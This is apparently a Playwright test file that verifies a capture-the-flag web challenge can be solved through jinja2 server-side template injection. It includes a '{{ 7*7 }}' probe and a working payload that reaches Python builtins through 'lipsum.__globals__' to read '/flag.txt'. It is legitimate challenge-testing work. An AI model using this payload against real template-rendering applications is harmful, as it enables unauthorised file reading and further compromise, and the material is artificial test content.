import { test, expect } from '@playwright/test'
import { READY_TIMEOUT_MS } from './timeouts'

const BASE_URL = 'http://localhost:5173/challenge/just-a-preview/'
const FLAG_REGEX = /(FLAG|CTF)\{[^}]+\}/
const EXPLOIT_PATH = '/preview'

// The seeded template, resent unchanged. This is the negative control: the
// preview endpoint has to work and has to NOT hand back the flag, otherwise a
// challenge that leaks it to every caller would pass the exploit assertion.
const SEEDED_SOURCE =
  'Summarise the support ticket below for {{ audience }}.\n' +
  'Keep the tone {{ tone }} and stay under 120 words.\n' +
  '\n' +
  'Subject: {{ ticket.subject }}\n' +
  'Body: {{ ticket.body }}'

// The standard SSTI probe. It separates "the input is compiled as template
// source" from "the input is inserted as data" — the two are indistinguishable
// on the seeded template, because that one is meant to carry placeholders.
const ARITHMETIC_PROBE = '{{ 7*7 }}'

// Prompt rendering uses a plain jinja2.Environment, so attribute traversal off
// a template global reaches __builtins__ and, through it, open().
const EXPLOIT_SOURCE = "{{ lipsum.__globals__.__builtins__.open('/flag.txt').read() }}"

const ready = (page: import('@playwright/test').Page) =>
  page.waitForFunction(
    () =>
      navigator.serviceWorker.controller !== null &&
      typeof (globalThis as { __wxlDispatch?: unknown }).__wxlDispatch === 'function',
    null,
    { timeout: READY_TIMEOUT_MS },
  )

test('just-a-preview is solvable by rendering a preview outside the sandbox', async ({ page }) => {
  await page.goto(BASE_URL)
  await ready(page)

  const { index, detail, baseline, probe, exploit } = await page.evaluate(
    async ({ path, seeded, arithmetic, payload }) => {
      const dispatch = (globalThis as unknown as {
        __wxlDispatch?: (req: Request) => Promise<Response>
      }).__wxlDispatch
      if (!dispatch) {
        throw new Error('__wxlDispatch not exposed on the page')
      }
      const base = 'https://challenge-just-a-preview.localhost'

      const get = async (p: string) => {
        const res = await dispatch(new Request(`${base}${p}`, { method: 'GET' }))
        return { status: res.status, body: await res.text() }
      }

      const render = async (source: string) => {
        const res = await dispatch(
          new Request(`${base}${path}`, {
            method: 'POST',
            headers: { 'content-type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ id: '1', source }).toString(),
          }),
        )
        return { status: res.status, body: await res.text() }
      }

      return {
        index: await get('/'),
        detail: await get('/t/1'),
        baseline: await render(seeded),
        probe: await render(arithmetic),
        exploit: await render(payload),
      }
    },
    {
      path: EXPLOIT_PATH,
      seeded: SEEDED_SOURCE,
      arithmetic: ARITHMETIC_PROBE,
      payload: EXPLOIT_SOURCE,
    },
  )

  // Nothing else in this repo exercises the two GET routes, so the whole
  // presentation layer rides on these two assertions. A challenge whose pages
  // render as literal HTML source is still exploitable through POST /preview
  // and would otherwise ship green — that is what happened once before.
  expect(index.status).toBe(200)
  expect(index.body).toContain('<table>')
  expect(index.body).not.toContain('&lt;table&gt;')
  expect(index.body).toContain('Ticket summary')

  expect(detail.status).toBe(200)
  expect(detail.body).toContain('<form class="editor"')
  expect(detail.body).not.toContain('&lt;form class=')
  // The seeded source reaches the textarea, so the editor is usable, not just present.
  expect(detail.body).toContain('Summarise the support ticket below for')

  // The preview works, substitutes the sample record, and leaks nothing.
  //
  // Read the substitution out of the output block, not out of the whole body:
  // the editor also prints the sample record in a static list on every preview
  // response, so a body-wide search for the ticket subject stays green even
  // with prompt rendering deleted entirely. Measured — that is exactly what the
  // first version of this assertion did.
  const outBlock = (body: string) => /<pre class="out">([\s\S]*?)<\/pre>/.exec(body)?.[1] ?? ''

  expect(baseline.status).toBe(200)
  expect(outBlock(baseline.body)).toContain('Card reader offline at Gate 4')
  expect(baseline.body).not.toMatch(FLAG_REGEX)

  // The submitted source is compiled, not inserted. `49` never appears in the
  // template, the sample record or any page template, so it can only have been
  // produced by evaluating the expression.
  expect(probe.status).toBe(200)
  expect(outBlock(probe.body)).toContain('49')

  expect(exploit.status).toBe(200)
  expect(outBlock(exploit.body)).toMatch(FLAG_REGEX)

  // The flag regex alone matches whether or not the page rendered: an
  // autoescaped body carries the same characters as visible HTML source, which
  // is how a completely unusable page once passed a spec like this one. Assert
  // on structure the browser would act on, not only on the text it contains.
  expect(exploit.body).toContain('<pre class="out">')
  expect(exploit.body).not.toContain('&lt;pre class=')
})
